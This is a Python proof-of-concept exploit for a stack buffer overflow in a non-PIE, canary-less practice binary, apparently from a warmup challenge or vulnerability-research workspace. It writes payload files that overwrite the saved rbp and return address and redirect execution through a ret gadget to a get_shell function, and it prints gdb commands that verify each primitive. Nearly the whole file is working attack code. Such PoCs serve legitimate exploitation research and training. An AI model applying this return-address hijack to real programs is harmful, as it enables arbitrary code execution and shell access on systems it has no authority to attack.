#!/usr/bin/env python3
"""
PoC for BUG-001: Stack Buffer Overflow in main()
Target: /work/workspace/0008-2021-28-warmup-20260905-182730/target

Vulnerability:
  read(0, rbp-0x70, 0x100) reads up to 256 bytes into a stack buffer
  that is only 0x70 (112) bytes below saved rbp.
  - Saved rbp at offset 0x70 = 112 from buffer start
  - Return address at offset 0x78 = 120 from buffer start
  - No stack canary, No PIE → return address fully overwritable

Primitives verified:
  PRIM-001: RIP_CONTROL — return address overwritten with attacker-controlled value
    Evidence: gdb at ret (0x4012ba), [rsp] = 0x4141414141414141 (val1) / 0x4242424242424242 (val2)
    Two different values prove attacker controls the return address.
    si after ret → SIGSEGV at 0x4141414141414141 (RIP hijacked to attacker value).

  PRIM-002: STACK_CONTROL — saved rbp overwritten with attacker-controlled value
    Evidence: gdb at ret (0x4012ba), rbp = 0x4242424242424242 (attacker-controlled)
    while [rsp] = 0x4141414141414141 (return address also controlled).

  PRIM-003: RIP redirect to get_shell (0x401182)
    Evidence: gdb si after ret → RIP = 0x401182 (get_shell)
    Proves RIP_CONTROL can redirect execution to attacker-specified address.

Usage:
  python3 poc-BUG-001.py
  # Generates payload files, then verify with gdb:
  # gdb -batch -ex 'b *0x4012ba' -ex 'run < payload_rip_val1.bin' \
  #     -ex 'info registers rip rbp rsp' -ex 'x/2gx $rsp' ./target

Environment:
  OS: Linux x86-64, glibc 2.39
  Binary: No PIE (base 0x400000), No Canary, NX enabled, Partial RELRO
"""
import struct
import os

WORKSPACE = "/work/workspace/0008-2021-28-warmup-20260905-182730"

# Offsets from buffer start (rbp-0x70)
OFFSET_TO_SAVED_RBP = 0x70   # 112 bytes
OFFSET_TO_RET_ADDR  = 0x78   # 120 bytes

# Fixed addresses (No PIE)
GET_SHELL  = 0x401182
RET_GADGET = 0x401016  # plain 'ret' for stack alignment

READ_SIZE = 0x100  # 256 bytes read by read()


def build_payload_256(ret_value, rbp_value=None):
    """
    Build exactly 256 bytes for read() + 'Y\\n' for scanf().
    read(0, buf, 0x100) reads up to 256 bytes from pipe.
    When 258 bytes are piped, read returns 256, leaving 'Y\\n' for scanf.
    scanf reads 'Y' → loop exits → leave;ret uses corrupted stack.
    """
    if rbp_value is None:
        rbp_value = 0x4141414141414141

    buf = b"A" * OFFSET_TO_SAVED_RBP                    # 112 bytes padding
    buf += struct.pack("<Q", rbp_value)                 # 8 bytes saved rbp
    buf += struct.pack("<Q", ret_value)                 # 8 bytes return address
    buf += b"\x00" * (READ_SIZE - len(buf))             # pad to 256 bytes
    buf += b"Y\n"                                       # for scanf to exit loop
    return buf


def build_payload_getshell():
    """Build payload that redirects RIP to get_shell via ret gadget (stack align)."""
    buf = b"A" * OFFSET_TO_SAVED_RBP                    # 112 bytes padding
    buf += struct.pack("<Q", 0x4141414141414141)        # saved rbp (don't care)
    buf += struct.pack("<Q", RET_GADGET)                # ret gadget for alignment
    buf += struct.pack("<Q", GET_SHELL)                 # get_shell address
    buf += b"\x00" * (READ_SIZE - len(buf))             # pad to 256 bytes
    buf += b"Y\n"                                       # for scanf to exit loop
    return buf


def main():
    print("=== BUG-001: Stack Buffer Overflow PoC ===")
    print(f"Buffer at rbp-0x70, saved rbp at offset {OFFSET_TO_SAVED_RBP}, "
          f"return addr at offset {OFFSET_TO_RET_ADDR}")
    print(f"read size: {READ_SIZE} bytes, buffer capacity: {OFFSET_TO_SAVED_RBP} bytes")
    print(f"Overflow: {READ_SIZE - OFFSET_TO_SAVED_RBP} bytes past buffer end")
    print()

    # PRIM-001: RIP_CONTROL with value 1 (0x4141414141414141)
    p1 = build_payload_256(0x4141414141414141, rbp_value=0x4141414141414141)
    f1 = os.path.join(WORKSPACE, "payload_rip_val1.bin")
    with open(f1, "wb") as f:
        f.write(p1)
    print(f"=== PRIM-001: RIP_CONTROL ===")
    print(f"  Payload 1: ret=0x4141414141414141 -> {f1} ({len(p1)} bytes)")
    print(f"  GDB evidence: b *0x4012ba; run < {f1}; x/2gx $rsp")
    print(f"  Expected: [rsp] = 0x4141414141414141 (ret will pop to RIP)")
    print()

    # PRIM-001b: RIP_CONTROL with value 2 (0x4242424242424242)
    p2 = build_payload_256(0x4242424242424242, rbp_value=0x4141414141414141)
    f2 = os.path.join(WORKSPACE, "payload_rip_val2.bin")
    with open(f2, "wb") as f:
        f.write(p2)
    print(f"  Payload 2: ret=0x4242424242424242 -> {f2} ({len(p2)} bytes)")
    print(f"  GDB evidence: b *0x4012ba; run < {f2}; x/2gx $rsp")
    print(f"  Expected: [rsp] = 0x4242424242424242 (different value proves control)")
    print()

    # PRIM-002: STACK_CONTROL
    p3 = build_payload_256(0x4141414141414141, rbp_value=0x4242424242424242)
    f3 = os.path.join(WORKSPACE, "payload_stack.bin")
    with open(f3, "wb") as f:
        f.write(p3)
    print(f"=== PRIM-002: STACK_CONTROL ===")
    print(f"  Payload: rbp=0x4242424242424242, ret=0x4141414141414141 -> {f3} ({len(p3)} bytes)")
    print(f"  GDB evidence: b *0x4012ba; run < {f3}; info registers rbp")
    print(f"  Expected: rbp = 0x4242424242424242 (saved rbp overwritten)")
    print()

    # PRIM-003: RIP redirect to get_shell
    p4 = build_payload_getshell()
    f4 = os.path.join(WORKSPACE, "payload_getshell.bin")
    with open(f4, "wb") as f:
        f.write(p4)
    print(f"=== PRIM-003: RIP redirect to get_shell ===")
    print(f"  Payload: ret_gadget(0x401016) + get_shell(0x401182) -> {f4} ({len(p4)} bytes)")
    print(f"  GDB evidence: b *0x4012ba; run < {f4}; si; si; info registers rip")
    print(f"  Expected: rip = 0x401182 (get_shell) after two si steps")
    print()

    print("=== All payloads generated ===")
    print("Verification commands:")
    print(f"  gdb -batch -ex 'b *0x4012ba' -ex 'run < {f1}' "
          f"-ex 'info reg rip rbp rsp' -ex 'x/2gx $rsp' ./target")
    print(f"  gdb -batch -ex 'b *0x4012ba' -ex 'run < {f2}' "
          f"-ex 'info reg rip rbp rsp' -ex 'x/2gx $rsp' ./target")
    print(f"  gdb -batch -ex 'b *0x4012ba' -ex 'run < {f3}' "
          f"-ex 'info reg rip rbp rsp' -ex 'x/2gx $rsp' ./target")
    print(f"  gdb -batch -ex 'b *0x4012ba' -ex 'run < {f4}' "
          f"-ex 'x/4gx $rsp' -ex 'si' -ex 'si' -ex 'info reg rip' ./target")


if __name__ == "__main__":
    main()
